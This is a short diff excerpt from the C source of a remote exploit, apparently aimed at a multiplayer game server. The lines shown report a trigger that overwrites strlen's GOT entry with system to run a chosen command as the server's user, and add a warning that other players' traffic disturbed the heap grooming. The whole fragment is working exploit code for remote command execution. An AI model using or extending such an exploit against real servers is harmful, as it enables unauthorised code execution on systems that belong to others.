+        printf("[+] trigger sent: strlen@got <- system, then strlen(\"%s\")\n", cmd);
+    }
     drainboth(A, R, 3000);
     printf("[*] done. If the target is vulnerable the command has run as the server's user.\n");
+    if (g_foreign)
+        printf("[!] %lu equipment relays from OTHER players were dropped during this run.\n"
+               "    They were not parsed as leak data, but the cell was not empty, so the heap was\n"
+               "    being churned by someone else while the chain groomed it. Treat a failure here as\n"
+               "    inconclusive rather than as evidence the target is not vulnerable.\n", g_foreign);
     return 0;
 }
